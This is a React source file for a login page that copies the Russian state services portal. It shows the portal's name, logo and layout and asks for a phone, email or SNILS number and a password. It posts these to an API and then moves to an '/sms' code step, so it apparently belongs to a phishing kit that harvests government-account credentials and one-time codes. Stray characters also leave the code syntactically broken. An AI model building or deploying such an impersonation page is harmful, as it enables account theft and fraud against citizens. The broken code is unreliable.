import { useState } from "react";
import { useNavigate } from "react-router-dom";
import PageLayout from "./components/PageLayout";
import InfoBanner from "./components/InfoBanner";
import Logo from "./components/Logo";
import { apiLogin } from "./utils/api";

function App() {
  const navigate = useNavigate();
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Валидация
    if (!login || !password) {
      setError("Введите логин и пароль");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const response = await apiLogin(login, password);
s
      console.log(response.data)

      if (response.status === "success" || response.status === "otp_required") {
        navigate("/sms");
      } else {s
        setError(response.message || "Ошибка входа");
      }
    } catch (error) {
      setError("Ошибка соединения с сервером");
      console.error("Login error:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <PageLayout>
      {/* Login Form Container */}
      <div className="w-full max-w-[384px]">
        {/* White Card with Everything Inside */}
        <div className="w-full bg-white rounded-2xl shadow-[0_6px_16px_rgba(230,235,245,0.8),0_1px_4px_rgb(227,235,252)] py-10 px-8">
          {/* Header with Logo - INSIDE the card */}
          <header className="mb-10">
            <div className="block mb-6 text-center">
              <span className="sr-only">Портал государственных услуг Российской Федерации</span>
              <Logo />
            </div>

            {/* Language Selector */}
            <div className="flex justify-center">
              <div className="flex items-center gap-2 text-[#0d4cd3] text-base font-normal">
                <span>Русский</span>
                <span className="flex w-6 h-6 rounded-full border border-[#d2dffb] relative overflow-hidden items-center justify-center">
                  <svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <mask id="mask0_7149_357" style={{ maskType: "luminance" }} maskUnits="userSpaceOnUse" x="0" y="0" width="28" height="22">
                      <path d="M0 0.241943H28V21.2419H0V0.241943Z" fill="white" />
                    </mask>
                    <g mask="url(#mask0_7149_357)">
                      <path fillRule="evenodd" clipRule="evenodd" d="M0 0.241943V21.2419H28V0.241943H0Z" fill="#3D58DB" />
                      <mask id="mask1_7149_357" style={{ maskType: "luminance" }} maskUnits="userSpaceOnUse" x="0" y="0" width="28" height="22">
                        <path fillRule="evenodd" clipRule="evenodd" d="M0 0.241943V21.2419H28V0.241943H0Z" fill="white" />
                      </mask>
                      <g mask="url(#mask1_7149_357)">
                        <path fillRule="evenodd" clipRule="evenodd" d="M0 0.241943V7.24194H28V0.241943H0Z" fill="#F7FCFF" />
                        <path fillRule="evenodd" clipRule="evenodd" d="M0 14.2415V21.2415H28V14.2415H0Z" fill="#C51918" />
                      </g>
                    </g>
                  </svg>
                </span>
              </div>
            </div>
          </header>

          {/* Login Form */}
          <form onSubmit={handleSubmit} noValidate className="space-y-5">
            {/* Login Input */}
            <div className="mb-5">
              <label htmlFor="login" className="block text-[14px] leading-5 text-[#0b1f33] mb-1 font-normal">
                Телефон / Эл. почта / СНИЛС
              </label>
              <input
                id="login"
                type="text"
                value={login}
                onChange={(e) => {
                  setLogin(e.target.value);
                  if (error) setError("");
                }}
                className={`w-full h-[52px] px-4 text-[16px] font-normal border-0 rounded-none outline-none text-[#0b1f33] focus:border-2 focus:border-[#99b1e6] focus:shadow-none ${
                  error ? "bg-[rgba(238,63,88,0.16)]" : "bg-[#f5f7fa]"
                }`}
                name="Телефон / Эл. почта / СНИЛС"
                autoComplete="on"
                tabIndex={0}
              />
            </div>

            {/* Password Input */}
            <div className="mb-5">
              <label htmlFor="password" className="block text-[14px] leading-5 text-[#0b1f33] mb-1 font-normal">
                Пароль
              </label>
              <div className="relative mb-2">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (error) setError("");
                  }}
                  className={`w-full h-[52px] px-4 pr-14 text-[16px] font-normal border-0 rounded-none outline-none text-[#0b1f33] focus:border-2 focus:border-[#99b1e6] focus:shadow-none ${
                    error ? "bg-[rgba(238,63,88,0.16)]" : "bg-[#f5f7fa]"
                  }`}
                  name="Пароль"
                  required
                  tabIndex={0}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-[14px] w-6 h-6 border-none bg-center bg-no-repeat cursor-pointer p-0 bg-transparent"
                  style={{
                    backgroundImage: showPassword
                      ? `url("data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M12.7498 7L12.7498 4H11.2498L11.2498 7H12.7498ZM18.4869 8.49525L19.9869 5.99525L18.7007 5.2235L17.2007 7.7235L18.4869 8.49525ZM4.01291 5.99525L5.51291 8.49525L6.79915 7.7235L5.29915 5.2235L4.01291 5.99525ZM4.67905 14.0005C6.3301 16.1174 8.98806 17.5003 11.9986 17.5003C15.0094 17.5003 17.6676 16.1171 19.3186 13.9998C18.2826 12.6714 16.85 11.632 15.1826 11.042C15.3862 11.4859 15.4998 11.9797 15.4998 12.5C15.4998 14.433 13.9328 16 11.9998 16C10.0668 16 8.49979 14.433 8.49979 12.5C8.49979 11.9795 8.61342 11.4855 8.81722 11.0415C7.14886 11.6315 5.71549 12.6713 4.67905 14.0005ZM20.8661 13.5754C18.9713 10.8143 15.7038 9.00188 12.0049 9L11.9998 9H11.9995H11.9991C8.29747 9 5.02719 10.8132 3.13156 13.5763C2.95613 13.832 2.95615 14.1693 3.1316 14.4249C5.02733 17.1874 8.2973 19.0003 11.9986 19.0003C15.7002 19.0003 18.9705 17.187 20.8661 14.424C21.0415 14.1683 21.0415 13.831 20.8661 13.5754Z' fill='%2366727F'/%3E%3C/svg%3E")`
                      : `url("data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M4.26133 8.40625L4.37662 8.58537C5.99327 10.9377 8.79726 12.5049 12.0001 12.5049C15.2021 12.5049 18.0055 10.9384 19.6223 8.58703L19.7338 8.41102L21.0012 9.21329L20.8823 9.4011C20.8774 9.4088 20.8724 9.41642 20.8673 9.42394C18.9719 12.1896 15.7018 14.0049 12.0001 14.0049C8.29857 14.0049 5.02872 12.1899 3.13333 9.42465C3.12923 9.41867 3.12522 9.41263 3.1213 9.40653L3 9.21807L4.26133 8.40625ZM11.2502 15.9997L11.2502 18.9997H12.7502V15.9997H11.2502ZM5.51313 14.5044L4.01313 17.0044L5.29937 17.7762L6.79937 15.2762L5.51313 14.5044ZM19.9871 17.0044L18.4871 14.5044L17.2009 15.2762L18.7009 17.7762L19.9871 17.0044Z' fill='%2366727F'/%3E%3C/svg%3E")`,
                  }}
                  tabIndex={0}
                  aria-label={showPassword ? "Скрыть пароль" : "Показать пароль"}
                />
              </div>

              {/* Error Message */}
              {error && <div className="text-[#e11432] text-[14px] leading-5 font-normal mb-1">{error}</div>}

              {/* Restore Password Link */}
              <div className="mb-10">
                <button
                  type="button"
                  className="text-[#0d4cd3] hover:text-[#1d5deb] text-[16px] bg-transparent border-none cursor-pointer p-0 font-normal"
                  tabIndex={0}>
                  Восстановить
                </button>
              </div>
            </div>

            {/* Submit Button */}
            <div className="mt-10">
              <button
                type="submit"
                disabled={loading}
                className="w-full h-[52px] px-4 py-3.5 bg-[#0d4cd3] hover:bg-[#1d5deb] active:bg-[#0b40b3] text-white rounded-lg text-[16px] leading-6 font-normal transition-colors cursor-pointer border-none disabled:opacity-50 disabled:cursor-not-allowed"
                tabIndex={0}>
                {loading ? "Загрузка..." : "Войти"}
              </button>
            </div>

            {/* Cannot Login Link */}
            <div className="mt-10 text-center">
              <button
                type="button"
                className="text-[#0d4cd3] hover:text-[#1d5deb] text-[16px] bg-transparent border-none cursor-pointer p-0 font-normal"
                tabIndex={0}>
                Не удаётся войти
              </button>
            </div>

            {/* Divider */}
            <hr className="w-[calc(100%+4rem)] -mx-8 border-t border-[#e1e1e1] my-10" />

            {/* Other Login Methods */}
            <div className="mt-10">
              <div className="text-left text-[16px] leading-6 text-[#0b1f33] mb-6 font-normal">
                Войти другим способом.{" "}
                <a href="/" className="text-[#0d4cd3] hover:text-[#1d5deb] no-underline cursor-pointer">
                  Подробнее
                </a>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <button
                  type="button"
                  className="h-[52px] px-4 py-3 border-2 border-[#0d4cd3] text-[#0d4cd3] bg-white hover:bg-[#f5f7fa] focus:bg-[#f5f7fa] rounded-lg text-[16px] leading-6 font-normal transition-colors cursor-pointer"
                  tabIndex={0}
                  aria-label="QR-код">
                  QR-код
                </button>
                <button
                  type="button"
                  className="h-[52px] px-4 py-3 border-2 border-[#0d4cd3] text-[#0d4cd3] bg-white hover:bg-[#f5f7fa] focus:bg-[#f5f7fa] rounded-lg text-[16px] leading-6 font-normal transition-colors cursor-pointer"
                  tabIndex={0}
                  aria-label="Эл. подпись">
                  Эл. подпись
                </button>
              </div>
            </div>
          </form>
        </div>

        {/* Register Link - OUTSIDE the card */}
        <div className="mt-5 md:mt-10 text-center">
          <button
            type="button"
            className="text-[#0d4cd3] hover:text-[#1d5deb] text-[16px] bg-transparent border-none cursor-pointer p-0 font-normal"
            tabIndex={0}>
            Зарегистрироваться
          </button>
        </div>
      </div>

      <InfoBanner />
    </PageLayout>
  );
}

export default App;
